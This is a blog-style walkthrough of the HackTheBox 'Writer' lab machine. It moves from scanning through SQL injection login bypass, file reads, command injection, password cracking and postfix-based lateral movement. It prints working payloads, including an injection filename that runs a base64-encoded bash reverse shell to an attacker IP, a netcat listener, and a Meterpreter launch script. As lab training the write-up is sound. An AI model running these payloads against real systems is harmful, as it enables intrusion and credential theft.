---
title: "HackTheBox Writer Writeup"
subtitle: "A walkthrough of the HackTheBox Writer machine"
date: 2021-12-20T10:20:35-05:00
lastmod: 2021-12-20T10:20:35-05:00
draft: false
author: "Nathan Higley"
authorLink: "https://blog.nathanhigley.com"
description: ""

tags: [writeup, hackthebox, hacking]
categories: [HackTheBox, Security]

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
license: ""
---


Writer is a Medium level box on HackTheBox that I worked through just prior to it being retired.  The machine was a lot of fun, but also had many steps to gain a foothold and finally to escalate to root.  It involved SQL injection, command injection, password cracking, and some scripting know how.  The initial foothold is real world like with multiple paths, but the privilege escalation was much more CTF style with a very clear singular path.


## Enumeration

The first thing to do is to add the following entry to `/etc/hosts`
```Awk
10.10.11.101    writer.htb
```

### Nmap
From there, an nmap scan should show us all the open and listening TCP ports on the machine:
```Awk
└─# nmap -A -p- -T4 writer.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-11 10:13 EST
Nmap scan report for writer.htb (10.10.11.101)
Host is up (0.096s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/11%OT=22%CT=1%CU=31410%PV=Y%DS=2%DC=T%G=Y%TM=61B4C0
OS:62%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=FC%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M54BST11NW7%O2=M54BST11NW7%O3
OS:=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1=FE88%W2=F
OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -9s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-12-11T15:14:30
|_  start_date: N/A

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   114.24 ms 10.10.10.1
2   40.20 ms  writer.htb (10.10.11.101)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.56 seconds
```

Interesting, this is an Ubuntu machine, running SSH and HTTP, which is fairly common on HackTheBox, but this box is also running Samba serving RPC and SMB. 

### smbclient
Using smbclient to list the shares we get the following:

```Awk
└─# smbclient -L writer.htb
Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        writer2_project Disk
        IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Trying to access the `writer2_project` gives us this:
```Awk
└─# smbclient  \\\\writer.htb\\writer2_project
Enter WORKGROUP\root's password:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

It can be assumed then that we need credentials to access this share and that guest access is disabled.  

### HTTP

Since it has HTTP running, lets just navigate to the site real quick:

![The Writer Site](writersite.png)

### GoBuster

My first guess looking at this would be possibly WordPress, but `/wp-admin` does not exist, so let's run a quick gobuster against the site and see what we find.

```Awk
└─# gobuster dir -t 10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://writer.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://writer.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/11 10:16:12 Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 3522]
/administrative       (Status: 200) [Size: 1443]
/contact              (Status: 200) [Size: 4905]
/dashboard            (Status: 302) [Size: 208] [--> http://writer.htb/]
/logout               (Status: 302) [Size: 208] [--> http://writer.htb/]
/server-status        (Status: 403) [Size: 275]
/static               (Status: 301) [Size: 309] [--> http://writer.htb/static/]

===============================================================
2021/12/11 10:19:37 Finished
===============================================================
```

Based on this, `/dashboard` is most likely behind a login, but `/administrative` looks the most promising.  Navigating there presents us with a login field:

![The Login](login.png)

### SQL Injection

My first thought here is SQL injection, but some manual tricks like `';-- OR 1=1` doesn't show any good signs.  Firing up burpsuite gets us the following request when trying username and password admin:

```plaintext
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://writer.htb/administrative
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://writer.htb
Connection: close
Upgrade-Insecure-Requests: 1

uname=admin&password=admin
```

Let's see what sqlmap can do with this as I have very limited experience with SQL injection:

```Awk
└─# sqlmap -u "http://writer.htb/administrative" --data "uname=user&password=pass" --risk 3
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.5.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:04:57 /2021-12-11/

[10:04:58] [INFO] resuming back-end DBMS 'mysql'
[10:04:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=user' AND (SELECT 6202 FROM (SELECT(SLEEP(5)))kXjZ) AND 'wrdL'='wrdL&password=pass
---
[10:04:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:04:58] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/writer.htb'

[*] ending @ 10:04:58 /2021-12-11/
```

sqlmap shows that this box is vulnerable to a "time-based blind" attack.  Now, I went down this path because I could not find another avenue, but as this method takes a very long time, I'll inform you that it is also vulnerable to a non-blind attack which I'll further describe.

### Administrative login bypass

Taking just the last bit of the sqlmap query and making it a little simpler, we are able to bypass the login page, using this value for admin: `admin' OR 1 AND 'wrdL'='wrdL`  Putting this into a request and url encoding the value we have:

```plaintext
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://writer.htb/administrative
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://writer.htb
Connection: close
Upgrade-Insecure-Requests: 1

uname=admin'+OR+1+AND+'wrdL'%3d'wrdL&password=admin
```

When this post request is sent through burpsuite, we are presented with the following page:

![Admin Redirect](admin.png)

Which then redirects us to the dashboard:

![Admin Dashboard](dashboard.png)

Now if you notice in the top corner of this page, it actually displays the query that we sent via the POST request.  I discovered after I had completed the box that you can actually get the output of your query on the Admin Redirect page which will prevent you from needing to do blind SQL injection.  But alas, I did not realize this and so I will show you the blind SQL injection that I did using sqlmap.

### Database Privileges

First, we want to get our privileges to see what we can do as the database user:

```Awk
└─# sqlmap -u "http://writer.htb/administrative" --data "uname=user&password=pass" --risk 3 --threads=10 --privileges

database management system users privileges:
[*] %admin% [1]:
    privilege: FILE

```

### Retrieving Files

#### Retrieving Apache Sites Enabled

This tells us that as the current user we can read files.  Now, blind SQL injection means that this will take a very long time to read a file, and we also do not have a way to know what files will be there other than guessing.  But we know that the box is running Apache on Ubuntu, so lets start with the default sites enabled configuration found at `/etc/apache2/sites-enabled/000-default.conf`  To do this we simply need to give sqlmap the `--file-read=/path/to/file` parameter, and it will download the file for us...using blind SQL injection.  This easily took 20 minutes to an hour per file as blind SQL injection is a very tedious process, but we were finally presented with the following file:

```ApacheConf
# Virtual host configuration for writer.htb domain
<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        <Directory /var/www/writer.htb>
                Order allow,deny
                Allow from all
        </Directory>
        Alias /static /var/www/writer.htb/writer/static
        <Directory /var/www/writer.htb/writer/static/>
                Order allow,deny
                Allow from all
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#<VirtualHost 127.0.0.1:8080>
#	ServerName dev.writer.htb
#	ServerAdmin admin@writer.htb
#
        # Collect static for the writer2_project/writer_web/templates
#	Alias /static /var/www/writer2_project/static
#	<Directory /var/www/writer2_project/static>
#		Require all granted
#	</Directory>
#
#	<Directory /var/www/writer2_project/writerv2>
#		<Files wsgi.py>
#			Require all granted
#		</Files>
#	</Directory>
#
#	WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
#	WSGIProcessGroup writer2_project
#	WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
#        ErrorLog ${APACHE_LOG_DIR}/error.log
#        LogLevel warn
#        CustomLog ${APACHE_LOG_DIR}/access.log combined
#
#</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

There is a lot in this file, so I will try to break it down as best I can.  Basically, the file tells us that Apache is serving a "wsgi" website from the `/var/www/writer.htb/` directory and a static website from the `/var/www/writer.htb/static/` location.  Now "wsgi" stands for Python Web Server Gateway Interface.  There is also a second site commented out that used to be served on port 8080 which lines up with the `writer2_project` SMB share we found earlier.

#### Retrieving __init__.py

So our next objective should be to start pulling the different files from that to see the source code of the site.  One of the most popular Python web frameworks is Django, and it is common to start with the file `__init__.py`

Trying a sqlmap request for `/var/www/writer.htb/writer/__init__.py` gives us the site just as we hoped it would.
```python
from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')

#Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
        return connector
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            return ("Something is wrong with your db user name or password!")
        elif err.errno == errorcode.ER_BAD_DB_ERROR:
            return ("Database does not exist")
        else:
            return ("Another exception, returning!")
    else:
        print ('Connection to DB is ready!')

#Define homepage
@app.route('/')
def home_page():
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('blog/blog.html', results=results)

#Define about page
@app.route('/about')
def about():
    return render_template('blog/about.html')

#Define contact page
@app.route('/contact')
def contact():
    return render_template('blog/contact.html')

#Define blog posts
@app.route('/blog/post/<id>', methods=['GET'])
def blog_post(id):
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    stories = cursor.fetchall()
    return render_template('blog/blog-single.html', results=results, stories=stories)

#Define dashboard for authenticated users
@app.route('/dashboard')
def dashboard():
    if not ('user' in session):
        return redirect('/')
    return render_template('dashboard.html')

#Define stories page for dashboard and edit/delete pages
@app.route('/dashboard/stories')
def stories():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "Select * From stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('stories.html', results=results)

@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)

        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)
        author = request.form.get('author')
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        return render_template('add.html')

@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
def edit_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
                cursor = connector.cursor()
                cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                result = connector.commit()
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor = connector.cursor()
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                        result = connector.commit()

                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('edit.html', error=error, results=results, id=id)
                except:
                    error = "Issue uploading picture"
                    return render_template('edit.html', error=error, results=results, id=id)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {'title':title, 'tagline':tagline, 'content':content, 'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')

    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('edit.html', results=results, id=id)

@app.route('/dashboard/stories/delete/<id>', methods=['GET', 'POST'])
def delete_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('delete.html', results=results, id=id)

#Define user page for dashboard
@app.route('/dashboard/users')
def users():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM users;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('users.html', results=results)

#Define settings page
@app.route('/dashboard/settings', methods=['GET'])
def settings():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error!"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM site WHERE id = 1"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('settings.html', results=results)

#Define authentication mechanism
@app.route('/administrative', methods=['POST', 'GET'])
def login_page():
    if ('user' in session):
        return redirect('/dashboard')
    if request.method == "POST":
        username = request.form.get('uname')
        password = request.form.get('password')
        password = hashlib.md5(password.encode('utf-8')).hexdigest()
        try:
            connector = connections()
        except mysql.connector.Error as err:
            return ("Database error")
        try:
            cursor = connector.cursor()
            sql_command = "Select * From users Where username = '%s' And password = '%s'" % (username, password)
            cursor.execute(sql_command)
            results = cursor.fetchall()
            for result in results:
                print("Got result")
            if result and len(result) != 0:
                session['user'] = username
                return render_template('success.html', results=results)
            else:
                error = "Incorrect credentials supplied"
                return render_template('login.html', error=error)
        except:
            error = "Incorrect credentials supplied"
            return render_template('login.html', error=error)
    else:
        return render_template('login.html')

@app.route("/logout")
def logout():
    if not ('user' in session):
        return redirect('/')
    session.pop('user')
    return redirect('/')

if __name__ == '__main__':
   app.run("0.0.0.0")
```

## Initial Foothold

### Analyzing Django Site

Again, there is a lot to this code if you have never used a Python web framework such as Django or Flask.  But we can see some important information from this, first we have database credentials exposed in plaintext:
```python
connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
```

More interestingly, when we look at the `/dashboard/stories/add` and `edit` functions, we see calls to `os.system` which is essentially a shell command:
```python
os.system("mv {} {}.jpg".format(local_filename, local_filename))
```

At first glance, this seems like we could easily get a command to execute by just giving a filename with special characters, but upon further inspection, the `local_filename` variable is actually pulled from the `urllib.request.urlretrieve` function:

```python
local_filename, headers = urllib.request.urlretrieve(image_url)
```

Looking at the page rendered on the site, we see the following:

![Edit post](edit.png)

So we can either upload an image, or give a URL to upload from.  Further research on the function which makes the `local_filename` variable shows that it produces a random temporary filename intended for one time use, but if it is pointed at a local file through the `file://` directive and the file exists, it simply returns the path to the file rather than making a copy of the file.  Now the code also has checks to make sure that the image is valid, but when looking further at the code, these checks only exist for the URL upload files and not the file upload option.  Instead, the file upload simply performs the following check:
```python
if ".jpg" in image.filename:
    path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
    image.save(path)
    image = "/img/{}".format(image.filename)
```

So it checks if `.jpg` is in the filename and if it is, then it saves it to the static folder.  So we now have a path to get a reverse shell:

1) Upload file with malicious filename 
2) Try to upload file via URL with `file://`
3) Inject code into the `os.command()` call

### Command Injection

So, I constructed the following filename:

`3.jpg & echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC8zOTM5IDA+JjEK" | base64 -d | bash;`

Evaluated, this will simply decode the base64 encoded payload and pipe it into bash.  That payload base64 decoded is:
```bash
bash -i >& /dev/tcp/10.10.10.10/3939 0>&1
```

We are then able to upload the malicious file, and then also verify it exists by navigating to the `/static/img` path of the website which will show us all the files.  Then when we go to execute the payload by referencing the file through the `file://` directive, we are given the following by the website:

![Upload failure](special.png)

While this seems to have foiled our evil scheme, it is actually only a client side validation, so disabling this via inspect element or sending the payload via burpsuite bypasses this check entirely.

### Reverse Shell

Then bam, we finally get a reverse shell:

```Awk
└─# nc -lvp 3939
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::3939
Ncat: Listening on 0.0.0.0:3939
Ncat: Connection from 10.10.11.101.
Ncat: Connection from 10.10.11.101:35588.
bash: cannot set terminal process group (1058): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@writer:/$
```

## Privilege Escalation

### Foothold Enumeration

From here we can start to actually investigate the running processes and other things on the machine.  Inspecting `/etc/passwd` shows us the two main users of the box:
```Awk
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash
```

Next we can look at what is running on the box:
```Awk
www-data@writer:/$ ss -tlpn
ss -tlpn
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
LISTEN    0         50                 0.0.0.0:445              0.0.0.0:*
LISTEN    0         80               127.0.0.1:3306             0.0.0.0:*
LISTEN    0         50                 0.0.0.0:139              0.0.0.0:*
LISTEN    0         10               127.0.0.1:8080             0.0.0.0:*        users:(("python3",pid=381422,fd=4))
LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*
LISTEN    0         100              127.0.0.1:25               0.0.0.0:*
LISTEN    0         50                    [::]:445                 [::]:*
LISTEN    0         50                    [::]:139                 [::]:*
LISTEN    0         511                      *:80                     *:*
LISTEN    0         128                   [::]:22                  [::]:*
```

So, port 8080 can likely be assumed to be the second website we observed earlier in the Apache config file. Port 445, 139, 22, and 80 we already know from the nmap scan. Port 53 is most likely local DNS.  Port 3306 is the MySQL database.  But port 25 is SMTP so there is likely a mail server running on this machine.

Continuing our research, we can now navigate to the `writer2_project` directory, and we see more Python Django files, including a `settings.py` file which could prove useful:
```Awk
www-data@writer:/var/www/writer2_project/writerv2$ cat settings.py | grep mysql
        'ENGINE': 'django.db.backends.mysql',
            'read_default_file': '/etc/mysql/my.cnf',
```

This points us to another file which just happens to have database credentials in plaintext:
```Awk
www-data@writer:/var/www/writer2_project/writerv2$ tail /etc/mysql/my.cnf

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
```

### Database Inspection

So now we can login to the database and inspect the tables:
```Awk
www-data@writer:/var/www/writer2_project/writerv2$ mysql -u djangouser -p
Enter password:

MariaDB [dev]> show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.001 sec)
```


Let's take a closer look at the `auth_user` table:
```Awk
MariaDB [dev]> select * from auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
1 row in set (0.000 sec)
```

### Password Cracking

Here we have a password hash for the user Kyle.  Since we saw the user on the box, we can assume that this is probably also their local user password.  Let's put it into hashcat and see what happens:
```Awk
└─# cat kyle.hash
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=

└─# hashcat -m 10000 kyle.hash --wordlist /usr/share/wordlists/rockyou.txt --show
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```

### Gaining Kyle

This gives us the password `marcoantonio` and using SSH we can now login as kyle and get user.txt:
```Awk
└─# ssh kyle@writer.htb
kyle@writer.htb's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
kyle@writer:~$ cat user.txt
<HASH>
```

### Kyle Enumeration

Now we need to escalate to root, but likely since there was another user on the box, we need to take a detour and gain the user john first.  Looking at the groups that kyle is a member of we notice the `filter` group in addition to the normal `kyle` and `smbgroup`
```Awk
kyle@writer:~$ cat /etc/group | grep kyle
kyle:x:1000:
filter:x:997:kyle
smbgroup:x:1002:kyle
```

Inspecting the box further, we can see that postfix is the service running on 25/tcp and coincidentally, the filter group exists on one of the files in the postfix configuration:
```Awk
kyle@writer:/etc/postfix$ ls -al
total 140
drwxr-xr-x   5 root root    4096 Jul  9 10:59 .
drwxr-xr-x 102 root root    4096 Jul 28 06:32 ..
-rwxrwxr-x   1 root filter  1021 Dec 11 14:32 disclaimer
-rw-r--r--   1 root root      32 May 13  2021 disclaimer_addresses
-rw-r--r--   1 root root     749 May 13  2021 disclaimer.txt
-rw-r--r--   1 root root      60 May 13  2021 dynamicmaps.cf
drwxr-xr-x   2 root root    4096 Jun 19  2020 dynamicmaps.cf.d
-rw-r--r--   1 root root    1330 May 18  2021 main.cf
-rw-r--r--   1 root root   27120 May 13  2021 main.cf.proto
lrwxrwxrwx   1 root root      31 May 13  2021 makedefs.out -> /usr/share/postfix/makedefs.out
-rw-r--r--   1 root root    6373 Dec 11 14:32 master.cf
-rw-r--r--   1 root root    6208 May 13  2021 master.cf.proto
-rw-r--r--   1 root root   10268 Jun 19  2020 postfix-files
drwxr-xr-x   2 root root    4096 Jun 19  2020 postfix-files.d
-rwxr-xr-x   1 root root   11532 Jun 19  2020 postfix-script
-rwxr-xr-x   1 root root   29872 Jun 19  2020 post-install
drwxr-xr-x   2 root root    4096 Jun 19  2020 sasl
```

### Postfix Inspection

Now, I had never used postfix before, so I was not really sure what to do with this, but if we look at the `master.cf` configuration file we see the following:
```Awk
kyle@writer:~$ cat /etc/postfix/master.cf | grep john
  flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```

Doing some research into postfix, what is actually happening here is that postfix will execute the `/etc/postfix/disclaimer` script when john receives an email.  This is useful to us since we can edit the script that it executes! What is better is that using `pspy64` we can see that when this executes, it executes as the user john:
```Awk
2021/12/11 14:32:08 CMD: UID=1001 PID=378522 | /bin/sh /etc/postfix/disclaimer -f kyle@writer.htb -- john@writer.htb
```

So now we have our path to escalate to john:

1) Edit the `/etc/postfix/disclaimer` script to call back to us.
2) Send an email to john.
3) The script will execute and give us a shell on the box.


### Gaining John

I prefer to use Meterpreter sessions rather than normal reverse shells as they call their own binary, so I generated a payload and copied it over.  I also created the following little script to detatch the Meterpreter binary from the process which calls it, which should prevent my session from dying:
```Awk
kyle@writer:/tmp/.tempdir$ cat script.sh
#!/bin/bash

nohup /tmp/.tempdir/shell.elf &
```

Now I just need to send an email to john somehow to get a callback.  Luckily, this is pretty easy to do using python:
```Awk
kyle@writer:/tmp/.tempdir$ python3
Python 3.8.10 (default, Jun  2 2021, 10:49:15)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import smtplib
>>> server = smtplib.SMTP("127.0.0.1", 25)
>>> server.sendmail("kyle@writer.htb", "john@writer.htb", "Get me a shell!")
```

